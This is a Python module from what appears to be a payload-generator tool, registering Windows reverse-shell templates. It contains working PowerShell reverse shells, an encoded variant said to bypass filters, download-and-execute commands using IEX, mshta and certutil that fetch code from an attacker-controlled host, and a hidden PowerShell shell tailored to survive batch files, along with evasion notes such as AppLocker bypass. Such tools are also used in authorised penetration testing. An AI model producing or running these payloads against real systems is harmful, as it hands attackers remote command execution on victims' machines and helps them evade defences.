"""Windows reverse shell payloads.

All templates avoid the '%' character. In a .bat file (used by the CI
harness and by many real-world delivery paths), '%' starts a variable
reference and cmd.exe will corrupt the payload before PowerShell sees it.
'ForEach-Object{0}' is the long form of '%{0}' and survives batch context.
"""

from payloadforge.payloads.registry import register

# --- PowerShell ---
register(
    "powershell_tcp",
    "windows", "powershell",
    "$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|ForEach-Object{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()",
    "PowerShell TCP reverse shell. Works on any Windows with PS 2.0+.",
    testable=False,
    test_note="PowerShell runs on Linux via pwsh but Windows socket behavior differs.",
    tags=["tcp", "powershell"],
)

register(
    "powershell_encoded",
    "windows", "powershell",
    "powershell -e {encoded}",
    "PowerShell reverse shell with base64-encoded payload. Bypasses some naive filters.",
    testable=False,
    test_note="Generate with: set encoder utf16le_b64 && generate powershell_tcp",
    tags=["tcp", "powershell", "encoded"],
)


register(
    "powershell_iex_web",
    "windows", "powershell",
    "IEX (New-Object Net.WebClient).DownloadString('http://{lhost}:{http_port}/shell.ps1')",
    "Downloads and executes a PowerShell script from your HTTP server.",
    testable=False,
    test_note="Run `serve` with shell.ps1 in the docroot. Needs pwsh or Windows.",
    tags=["http", "powershell"],
)

register(
    "mshta",
    "windows", "mshta",
    "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://{lhost}:{http_port}/a'))\"\":close\")",
    "mshta HTA payload. Uses LOLBIN — often bypasses AppLocker.",
    testable=False,
    test_note="mshta.exe is Windows-only.",
    tags=["lolbin", "mshta"],
)

register(
    "certutil_download",
    "windows", "cmd",
    "certutil -urlcache -split -f http://{lhost}:{http_port}/payload.exe %TEMP%\\p.exe && %TEMP%\\p.exe",
    "Uses certutil (a signed Windows binary) to download and execute a file. LOLBIN.",
    testable=False,
    test_note="Windows-only. Run `serve` with payload.exe in the docroot.",
    tags=["lolbin", "certutil", "download"],
)

# --- Hidden PowerShell one-liner (no cmd /c prefix, no % chars) ---
register(
    "cmd_powershell",
    "windows", "cmd",
    "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|ForEach-Object{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\"",
    "Hidden PowerShell reverse shell launched from cmd.exe. No '%' characters — "
    "survives being saved to a .bat file.",
    testable=False,
    test_note="Windows-only.",
    tags=["tcp", "cmd", "powershell", "hidden"],
)
